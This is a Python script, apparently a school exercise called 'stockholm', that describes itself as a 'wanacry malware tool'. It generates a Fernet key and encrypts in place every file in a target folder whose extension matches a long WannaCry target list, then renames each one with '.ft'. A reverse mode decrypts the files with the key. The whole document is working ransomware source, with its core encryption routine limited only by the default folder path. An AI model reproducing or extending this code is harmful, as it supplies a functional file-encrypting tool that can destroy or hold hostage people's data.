import argparse, sys, os
from pathlib import Path
from cryptography.fernet import Fernet

mainDir = str(Path.home()) + "/infection"

wanacry = [
    ".123", ".3dm", ".3ds", ".3g2", ".3gp", ".602", ".7z", ".ARC", ".PAQ", ".accdb", 
    ".aes", ".ai", ".asc", ".asf", ".asm", ".asp", ".avi", ".backup", ".bak", ".bat", 
    ".bmp", ".brd", ".bz2", ".cgm", ".class", ".cmd", ".cpp", ".crt", ".cs", ".csr", 
    ".csv", ".db", ".dbf", ".dch", ".der", ".dif", ".dip", ".djv", ".djvu", ".doc", 
    ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx", ".fla", ".flv", ".frm", ".gif", 
    ".gpg", ".hwp", ".ibd", ".jar", ".java", ".jpeg", ".jpg", ".key", ".lay", ".lay6", 
    ".ldf", ".m3u", ".m4u", ".max", ".mdb", ".mdf", ".mid", ".mkv", ".mml", ".mov", 
    ".mp3", ".mp4", ".mpeg", ".mpg", ".ms11", ".myd", ".myi", ".nef", ".odb", ".odg", 
    ".odp", ".ods", ".odt", ".otg", ".otp", ".ots", ".ott", ".p12", ".paq", ".pas", 
    ".pdf", ".pem", ".pfx", ".php", ".pl", ".png", ".pot", ".potm", ".potx", ".ppam", 
    ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".psd", ".rar", ".raw", ".rtf", 
    ".sch", ".sh", ".slk", ".sql", ".sqlite3", ".sqlitedb", ".stc", ".std", ".sti", 
    ".stw", ".svg", ".swf", ".sxc", ".sxd", ".sxi", ".sxm", ".sxw", ".tar", ".tbk", 
    ".tgz", ".tif", ".tiff", ".txt", ".uop", ".uot", ".vb", ".vbs", ".vcd", ".vdi", 
    ".vmdk", ".vmx", ".vob", ".wav", ".wb2", ".wk1", ".wks", ".wma", ".wmv", ".xlc", 
    ".xlm", ".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".zip"
]

def getArgs():
	getter = argparse.ArgumentParser(description="wanacry malware tool")
	getter.add_argument('-v', '--version',action='store_true', help='version')
	getter.add_argument('-s', '--silent', action='store_true', help='silent mode')
	getter.add_argument('-r', '--reverse', type=str, help='reverse mode')
	getter.add_argument('-p', '--path', default=mainDir, help='port')
	return(getter.parse_args())

def encrypt(keyfile, before, silent):
	try:
		with open(keyfile, 'rb') as file:
			lector = file.read()
		encripter = Fernet(lector)
	except:
		quit('Keyfile can´t be opened')
	with open(before, 'rb') as file:
		data = file.read()
		encripteddata = encripter.encrypt(data)
	with open(before, 'wb') as file:
		file.write(encripteddata)
	os.rename(before, before + '.ft')
	if not silent:
		print(before.split('/')[-1] + ' has been encrypted')

def decode(keyfile, before, silent):
	local = before.split('/')[-1]
	try:
		with open(keyfile, 'rb') as file:
			reader = file.read()
		key = Fernet(reader)
	except FileNotFoundError:
		quit('keyFile not found')
		return
	except Exception as e:
		print('Error: ' + str(e))
		return
	with open(before, 'rb') as o:
		encripted = o.read()
	try:
		clean = key.decrypt(encripted)
	except Exception as e:
		return
	with open(before, 'wb') as o:
		o.write(clean)
	os.rename(before, before[:-3])
	if not silent:
		print('File: {} has been decrypted'.format(local))

def genkey():
	key = Fernet.generate_key()
	open('stockholm.key', 'wb').write(key)
	# return(encripter.write(key))

def ft_stockholm():
	args = getArgs()
	if args.version:
		quit('version 1.0.1 (c) 2023')
	elif not args.reverse:
		genkey()
		for file in os.listdir(args.path):
			if os.path.splitext(file)[1] in wanacry:
				encrypt('stockholm.key', os.path.join(args.path, file), args.silent)
			else:
				if not args.silent:
					print('file {} cant be encrypted'.format(file))
	elif args.reverse:
		for file in os.listdir(args.path):
			if os.path.isfile(os.path.join(args.path, file)):
				decode(args.reverse, os.path.join(args.path, file), args.silent)
			else:
				print('Error: {}  is not a file'.format(file))
if __name__ == '__main__':
	ft_stockholm()

